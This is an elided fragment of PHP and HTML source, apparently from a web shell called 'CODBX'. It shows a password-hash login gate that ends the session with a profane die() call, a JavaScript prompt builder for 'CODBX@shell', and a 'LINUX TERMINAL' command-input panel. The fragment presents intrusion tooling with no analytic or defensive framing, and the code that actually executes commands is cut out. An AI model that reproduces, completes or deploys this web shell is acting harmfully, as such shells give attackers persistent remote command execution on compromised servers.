...
{
  foreach($codbx_users as $uspw)
   {
	if(strpos($uspw, ";") !== false)
	{
	list($user, $pass) = explode(';',$uspw);
	 if((md5(sha1($pass))) == $passsession)
		return true;
	}
   }
}
...
if(((isLoginUser())==false)&&(empty($_SESSION['codbxuserexec'])))
	die('fuck');
if(empty($_SESSION['codbxuserexec']))
	die('fuck');
    ...
    <head>
        ...
        <script>
            ...
            function genPrompt(cwd) {
                ...
                return "CODBX@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
            }
...
LINUX TERMINAL
            ...
            <div id="shell-input">
                <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???CODBX@shell</label>
                <div>
